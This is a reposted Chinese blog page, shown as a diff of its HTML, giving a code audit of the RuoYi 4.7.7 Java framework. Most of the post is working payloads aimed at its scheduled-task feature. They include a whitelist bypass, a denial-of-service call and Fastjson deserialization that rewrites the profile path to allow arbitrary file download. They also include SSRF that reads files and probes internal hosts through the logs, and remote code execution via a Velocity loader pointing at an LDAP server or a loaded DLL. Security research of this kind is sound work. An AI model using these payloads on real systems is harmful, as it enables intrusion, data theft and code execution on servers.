@@ -1,0 +1,399 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>【转载】Ruoyi4.7.7代码审计 | flyD</title>
+
+<link rel="shortcut icon" href="https://flyd.uk/favicon.ico?v=1699457449077">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://flyd.uk/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dart.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/go.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/python.min.js"></script>
+
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script> 
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            flyD
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699457449077"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    【转载】Ruoyi4.7.7代码审计
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-11-07 ·
+                    </time>
+                    
+                        <a href="https://flyd.uk/pWno6tyaZ/" class="post-tags">
+                            # 若依
+                        </a>
+                    
+                        <a href="https://flyd.uk/8y3sZVfEoH/" class="post-tags">
+                            # 代码审计
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <p>Ruoyi4.7.7代码审计 转载自S1lly师傅</p>
+<!-- more -->
+<p><a href="https://github.com/yangzongzhuan/RuoYi">若依</a>是一款基于SpringBoot开发的轻量级Java快速开发框架。</p>
+<h3 id="绕过">绕过</h3>
+<p>白名单是com.ruoyi，作者本意是这个包打头，但是事实上只需要包含这个字符串就可以，且ruoyi会舍弃)括号右边的内容，因此在最后面加入com.ruoyi就可了，然后只需要不在黑名单中的类即可。</p>
+<h3 id="拒绝服务">拒绝服务</h3>
+<p>这个bean没被过滤，可以直接关掉服务</p>
+<pre><code>shutdownManager.destroy
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://flyd.uk/post-images/1699352410468.png" alt="" loading="lazy"></figure>
+<h3 id="fastjson反序列化">Fastjson反序列化</h3>
+<p>ruoyi定时任务是可以执行parseObject的，可惜Fastjson1.2.83过滤太多，老版本可以用一些payload打ldap</p>
+<pre><code>com.alibaba.fastjson.JSONObject.parseObject(&quot;{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;com.ruoyi.cqbhebeutg.dgrh3.cn&quot;}&quot;)
+</code></pre>
+<h4 id="取消fastjson限制之后">取消fastjson限制之后</h4>
+<p>可以用来反序列化修改profile，进而实现任意文件下载</p>
+<p>原理就是fastjson反序列化会自动调用setter，然后修改之前的profile</p>
+<p>用unicode绕过一下黑名单过滤就好了，配合SSRF可以拿到一些输出，如果改成别的路径，就可以用来下载文件</p>
+<pre><code>com.alibaba.fastjson.JSONObject.parseObject(&quot;{&quot;@type&quot;:&quot;com.ruoyi.\u0066ramework.config.RuoYiConfig&quot;,&quot;profile&quot;:&quot;YOUR TARGET PATH&quot;}&quot;)
+</code></pre>
+<p>示例：</p>
+<p>在启动类加入</p>
+<p><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
+<p>然后执行上述定时任务，指定一个已知的目录绝对路径，例如可查的项目的目录，如果不写绝对目录，那么就是相对目录，就会创建在项目路径下：</p>
+<p><code>com.alibaba.fastjson.JSONObject.parseObject(&quot;{&quot;@type&quot;:&quot;com.ruoyi.\u0066ramework.config.RuoYiConfig&quot;,&quot;profile&quot;:&quot;D:/ftp&quot;}&quot;)</code></p>
+<figure data-type="image" tabindex="2"><img src="https://flyd.uk/post-images/1699352428290.png" alt="" loading="lazy"></figure>
+<p>可以看到profile值已经被修改为了我们指定的<code>D:/ftp</code></p>
+<p>如果我们此时向系统中上传文件，就会将文件写入到项目的目录中，这样就实现了向固定目录写入文件，此时通过<code>org.apache.velocity.runtime.RuntimeInstance.init</code>去实现RCE就很方便了，因为文件的路径变成了完全可控</p>
+<figure data-type="image" tabindex="3"><img src="https://flyd.uk/post-images/1699352439876.png" alt="" loading="lazy"></figure>
+<p>既然修改了资源目录，那是不是指定一个目录然后任意去下载文件呢</p>
+<p><code>http://127.0.0.1/common/download/resource?resource=/profile/read.txt</code></p>
+<p><img src="https://flyd.uk/post-images/1699352459693.png" alt="" loading="lazy"><br>
+<img src="https://flyd.uk/post-images/1699352464776.png" alt="" loading="lazy"><br>
+<img src="https://flyd.uk/post-images/1699352470804.png" alt="" loading="lazy"><br>
+因为存在后缀检查，所以能下载的文件有</p>
+<figure data-type="image" tabindex="4"><img src="https://flyd.uk/post-images/1699352481861.png" alt="" loading="lazy"></figure>
+<p>但是，如果将profile直接设置为文件呢</p>
+<p><code>com.alibaba.fastjson.JSONObject.parseObject(&quot;{&quot;@type&quot;:&quot;com.ruoyi.\u0066ramework.config.RuoYiConfig&quot;,&quot;profile&quot;:&quot;D:/ftp/read.aaa&quot;}&quot;)</code></p>
+<figure data-type="image" tabindex="5"><img src="https://flyd.uk/post-images/1699352496858.png" alt="" loading="lazy"></figure>
+<p>拼接之后就是文件本身，因此实现了任意文件下载，这样也就复刻了前面版本中的任意文件下载</p>
+<p>这里只需要不携带<code>/profile</code>且后缀是<code>允许的后缀</code>即可</p>
+<p><code>http://127.0.0.1/common/download/resource?resource=Info.xml:.txt</code></p>
+<p><img src="https://flyd.uk/post-images/1699352518401.png" alt="" loading="lazy"><br>
+<img src="https://flyd.uk/post-images/1699352521407.png" alt="" loading="lazy"></p>
+<h4 id="解禁fastjson后的完整ssrf">解禁fastjson后的完整SSRF</h4>
+<p>已知下面这个方法可以实现file和ftp协议，仔细看这个方法，会将所有的输出都通过日志打印到控制台，也就是说同时会保存到日志文件中，如果用上述的任意文件读取，就可以实现SSRF的回显获取</p>
+<p><code>com.ruoyi.common.utils.http.HttpUtils.sendGet</code></p>
+<p><img src="https://flyd.uk/post-images/1699352532170.png" alt="" loading="lazy"><br>
+首先读取日志配置文件，如果是war包部署，拼接上文件名即可，如果是jar包部署，就把jar包下载下来</p>
+<p><code>D:/RuoYi-fast-4.7.7/src/main/resources/logback.xml</code></p>
+<p>payload如下：</p>
+<p><code>com.alibaba.fastjson.JSONObject.parseObject(&quot;{&quot;@type&quot;:&quot;com.ruoyi.\u0066ramework.config.RuoYiConfig&quot;,&quot;profile&quot;:&quot;D:/RuoYi-fast-4.7.7/src/main/resources/logback.xml&quot;}&quot;)</code></p>
+<figure data-type="image" tabindex="6"><img src="https://flyd.uk/post-images/1699352544195.png" alt="" loading="lazy"></figure>
+<p>然后任意文件读取拿到日志配置信息</p>
+<figure data-type="image" tabindex="7"><img src="https://flyd.uk/post-images/1699352547454.png" alt="" loading="lazy"></figure>
+<p>那么可以知道，日志的保存路径，日志名称等，拼接拿到日志</p>
+<p><code>D:\RuoYi-fast-4.7.7\ruoyi\logs\sys-info.log</code></p>
+<p>接下来执行SSRF请求，通过file协议读文件</p>
+<p><code>com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;file:///D:/ftp/read.txt&quot;)</code></p>
+<figure data-type="image" tabindex="8"><img src="https://flyd.uk/post-images/1699352574764.png" alt="" loading="lazy"></figure>
+<p>可以看到文件内容输出在了控制台，同时日志里也保存了文件内容</p>
+<figure data-type="image" tabindex="9"><img src="https://flyd.uk/post-images/1699352581357.png" alt="" loading="lazy"></figure>
+<p>那么通过任意文件读取就可以从服务器上面下载日志了，先执行下面payload</p>
+<p><code>com.alibaba.fastjson.JSONObject.parseObject(&quot;{&quot;@type&quot;:&quot;com.ruoyi.\u0066ramework.config.RuoYiConfig&quot;,&quot;profile&quot;:&quot;D:/RuoYi-fast-4.7.7/ruoyi/logs/sys-info.log&quot;}&quot;)</code></p>
+<figure data-type="image" tabindex="10"><img src="https://flyd.uk/post-images/1699352592243.png" alt="" loading="lazy"></figure>
+<p>执行下载，拿到SSRF回显</p>
+<figure data-type="image" tabindex="11"><img src="https://flyd.uk/post-images/1699352600242.png" alt="" loading="lazy"></figure>
+<p>由于此时已经修改了profile，后续执行SSRF都可以直接访问并拿到回显</p>
+<p>由于file协议支持UNC路径，于是可以用来探测内网</p>
+<p><code>file://192.168.1.106/D$/ftp/read.txt</code></p>
+<p>使用如下payload，如果目标存在，读取文件：</p>
+<p><code>com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;file://192.168.1.106/C$/windows/win.ini&quot;)</code></p>
+<figure data-type="image" tabindex="12"><img src="https://flyd.uk/post-images/1699352648997.png" alt="" loading="lazy"></figure>
+<p>目标不存在，则不会有回显日志，且会产生一个异常日志，同样的方式读取异常日志，可以看到连接超时：</p>
+<p><code>com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;file://192.168.123.233/C$/windows/win.ini&quot;)</code></p>
+<figure data-type="image" tabindex="13"><img src="https://flyd.uk/post-images/1699352663465.png" alt="" loading="lazy"></figure>
+<p><code>com.alibaba.fastjson.JSONObject.parseObject(&quot;{&quot;@type&quot;:&quot;com.ruoyi.\u0066ramework.config.RuoYiConfig&quot;,&quot;profile&quot;:&quot;D:/RuoYi-fast-4.7.7/ruoyi/logs/sys-error.log&quot;}&quot;)</code></p>
+<figure data-type="image" tabindex="14"><img src="https://flyd.uk/post-images/1699352678864.png" alt="" loading="lazy"></figure>
+<p>读取不存在的文件，也是无回显的，且不会产生异常</p>
+<p><code>com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;file://192.168.123.233/C$/windows/asdasd&quot;)</code></p>
+<figure data-type="image" tabindex="15"><img src="https://flyd.uk/post-images/1699352691259.png" alt="" loading="lazy"></figure>
+<p>因此如果主机存在，就会读取到内容</p>
+<p>如果主机存在但是未开放共享，则读不到内容且不会产生异常日志，由于windows主机默认开启共享，可以一定程度判断是linux主机</p>
+<p>如果主机不存在，就会产生连接超时的日志</p>
+<h3 id="ssrf">SSRF</h3>
+<h4 id="ftp协议">ftp协议</h4>
+<pre><code>com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;ftp://asd.cqbhebeutg.dgrh3.cn&quot;)
+com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;ftp://b:b@192.168.1.106/1.zip&quot;)
+com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;telnet://192.168.1.106:6666&quot;)
+</code></pre>
+<h4 id="file协议">file协议</h4>
+<p>读到配置文件,但是这个是在控制台，同时会写入日志，如果能拿到日志，就可以读取到文件内容了，配合fastjson反序列化修改profile，就可以修改并下载了</p>
+<pre><code>com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;file:///C:/xxxxx/src/main/resources/application.yml&quot;)
+com.ruoyi.common.utils.http.HttpUtils.sendGet(&quot;file:///D:/ftp/1111.txt&quot;)
+</code></pre>
+<h3 id="rce">RCE</h3>
+<h4 id="ldap方式">ldap方式</h4>
+<p>先上传一张图片后缀的文本文件，公告处上传是会回显路径的，和默认保存地址拼接一下，去掉profile即可，payload为：</p>
+<pre><code>resource.loader = ds
+ds.resource.loader.public.name = DataSource
+ds.resource.loader.description = Velocity DataSource Resource Loader
+ds.resource.loader.class = org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader
+ds.resource.loader.datasource_url = ldap://xxxxxx:xxxx/to0mnt
+ds.resource.loader.resource.table = tb_velocity_template
+ds.resource.loader.resource.keycolumn = id_template
+ds.resource.loader.resource.templatecolumn = template_definition
+ds.resource.loader.resource.timestampcolumn = template_timestamp
+ds.resource.loader.cache = false
+ds.resource.loader.modificationCheckInterval = 60
+</code></pre>
+<p>定时任务里面，执行就可以了，目前的不足就是需要拿到绝对路径，但是这个是有默认值的</p>
+<p>且运行的jdk需要是低版本，目前还没找到关闭trustURLCodebase的方式</p>
+<pre><code>org.apache.velocity.runtime.RuntimeInstance.init(&quot;D:\ruoyi\uploadPath\upload\2023\11\06\exp_20231106002455A001.jpg&quot;)com.ruoyi
+</code></pre>
+<h4 id="加载动态链接库">加载动态链接库</h4>
+<p>加载动态链接库。缺点还是绝对路径，前面的目录穿越不可省，且限定了后缀，因此要想ruoyi中可以利用，还需要有文件上传点上传任意文件</p>
+<pre><code>com.sun.glass.utils.NativeLibLoader.loadLibrary(&quot;..\..\..\..\..\..\..\..\..\..\..\..\..\..\Users\Administrator\source\repos\Dll1\x64\Debug\Dll1&quot;)com.ruoyi
+</code></pre>
+<p>dll用vscode默认生成一个就行了，然后在入口处加入任意代码部分</p>
+<pre><code>BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        system(&quot;calc&quot;);
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p><img src="https://flyd.uk/post-images/1699352712416.png" alt="" loading="lazy"><br>
+<img src="https://flyd.uk/post-images/1699352715328.png" alt="" loading="lazy"></p>
+<h3 id="无回显的读取没啥用">无回显的读取，没啥用</h3>
+<p>调试可以读，但是拿不到回显</p>
+<pre><code>com.ruoyi.common.utils.spring.SpringUtils.getRequiredProperty(&quot;ruoyi.profile&quot;)
+com.ruoyi.common.utils.spring.SpringUtils.getActiveProfile()
+</code></pre>
+<h3 id="关于开启fastjson的autotype和加白名单">关于开启fastjson的autotype和加白名单</h3>
+<h5 id="autotype">autotype</h5>
+<p>由于定时任务里面执行是会新建一个类，因此无法获取单例模式下的类，因此无法向fastjson的白名单中添加类，同时由于ruoyi是向类传递一个对象，而设置autotype是基础类型，因此无法执行，无法实现开启autotype</p>
+<figure data-type="image" tabindex="16"><img src="https://flyd.uk/post-images/1699352728565.png" alt="" loading="lazy"></figure>
+<p>实际上要添加，是需要这样的</p>
+<pre><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+</code></pre>
+<p>但是定时任务里面，执行是这样的：</p>
+<pre><code>com.alibaba.fastjson.parser.ParserConfig.setAutoTypeSupport(true);
+</code></pre>
+<p>这个会被转成java.lang.Boolean对象，因此无法执行，且不是单例模式</p>
+<h5 id="白名单">白名单</h5>
+<p>如果要添加，也是单例模式的</p>
+<pre><code>ParserConfig.getGlobalInstance().addAccept(&quot;org.&quot;);
+</code></pre>
+<p>定时任务里面只能这样写，也是无法生效的：</p>
+<pre><code>com.alibaba.fastjson.parser.ParserConfig.addAccept(&quot;com.ruoyi.&quot;)
+</code></pre>
+<h4 id="继续挖掘fastjson中的类或许还会有收获">继续挖掘fastjson中的类，或许还会有收获</h4>
+<p>找到一个可以修改global的，就可以实现bypass了</p>
+<p><img src="https://flyd.uk/post-images/1699352741399.png" alt="" loading="lazy"><br>
+<img src="https://flyd.uk/post-images/1699352744161.png" alt="" loading="lazy"></p>
+<h3 id="关于开启trusturlcodebase">关于开启trustURLCodebase</h3>
+<p>下面这些会执行失败，因为无法设置private的属性值，如果能找到什么地方可以调用这个设置，就可以突破</p>
+<p>或者使用System.load来加载动态链接库</p>
+<pre><code>java.lang.System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;)com.ruoyi
+java.lang.System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;)com.ruoyi
+</code></pre>
+<p>考虑使用codeql检索可以任意设置的地方，然而并没有可控的，直接哭晕在厕所</p>
+<pre><code>import java
+
+from MethodAccess ma
+where
+  ma.getMethod().getName() = &quot;setProperty&quot; and
+  ma.getMethod().getDeclaringType().getName() = &quot;System&quot; and
+  ma.getMethod().getNumberOfParameters() = 2
+select ma,ma.getArgument(0), ma.getArgument(1)
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://flyd.uk/post-images/1699352755016.png" alt="" loading="lazy"></figure>
+<p>检索使用了loadLibrary的类</p>
+<pre><code>import java
+
+from MethodAccess ma
+where
+  ma.getMethod().getName() = &quot;loadLibrary&quot; and
+  ma.getMethod().getDeclaringType().getName() = &quot;System&quot; and
+  ma.getMethod().getNumberOfParameters() = 1
+select ma,ma.getArgument(0)
+</code></pre>
+<p><code>src\share\classes\java\lang\Compiler.java</code></p>
+<figure data-type="image" tabindex="18"><img src="https://flyd.uk/post-images/1699352764065.png" alt="" loading="lazy"></figure>
+<p>这就需要找到地方可以setProperty</p>
+<pre><code>String jit = System.getProperty(&quot;java.compiler&quot;);
+</code></pre>
+<p>又回到最初的起点~~~~</p>
+<p>只能寄希望于调用的其他的第三方jar包里面可以任意设置了</p>
+<h4 id="平替snackyaml无效">平替snackyaml（无效）</h4>
+<p>只是记录一下，如果不是<code>org.springframework</code>被加黑了，那么这个是一个极好的触发点~~~</p>
+<p>这个类将json转为yaml，然后调用snackyaml去加载load，理论上也是可以实现snakeyaml的利用</p>
+<pre><code>YamlJsonParser yamlJsonParser = new YamlJsonParser();
+yamlJsonParser.parseList(&quot;{JSON yaml}&quot;);
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://flyd.uk/post-images/1699352776024.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://flyd.uk/post-images/1699352780806.png" alt="" loading="lazy"></figure>
+
+                </div>
+            </article>
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/xiaoWangSec" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    
+    <div class="slogan gt-c-content-color-first"><script type='text/javascript'>
+$.get("https://v1.hitokoto.cn/",function(data,status){
+  if (status == 'success'){
+    $('.slogan.gt-c-content-color-first').text(data.hitokoto);
+  }else{
+    $('.hitokoto').text('奈何明月照沟渠');
+  }
+});
+</script></div>
+
+    <!-- <div class="footer-info">
+        
+    </div> -->
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://flyd.uk/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
